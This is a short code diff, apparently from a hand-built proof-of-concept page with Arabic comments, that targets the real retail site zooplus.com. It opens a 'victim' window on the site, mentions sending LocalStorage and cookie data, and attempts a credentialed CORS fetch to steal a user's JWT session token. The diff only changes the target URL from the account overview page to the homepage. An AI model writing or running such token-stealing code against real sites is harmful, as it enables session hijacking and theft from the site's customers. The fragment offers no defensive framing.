@@ -26,7 +26,7 @@
             document.getElementById('status').innerHTML += "<p>> فتح نافذة الضحية...</p>";
             
             // 1. فتح نافذة الموقع المستهدف
-            const victimWin = window.open('https://www.zooplus.com/account/overview', 'Victim');
+            const victimWin = window.open('https://www.zooplus.com/', 'Victim');
 
             // 2. إرسال البيانات المتوفرة حالياً (LocalStorage/Cookies)
             // ملاحظة: هذه البيانات ستكون خاصة بنطاق المهاجم ما لم يتم الحقن
@@ -44,7 +44,7 @@
 
             // 3. محاولة سحب الـ JWT عبر طلب CORS (في حال وجود الضعف الذي افترضناه)
             try {
-                const response = await fetch('https://www.zooplus.com/account/overview', {
+                const response = await fetch('https://www.zooplus.com/', {
                     method: 'GET',
                     mode: 'cors',
                     credentials: 'include'
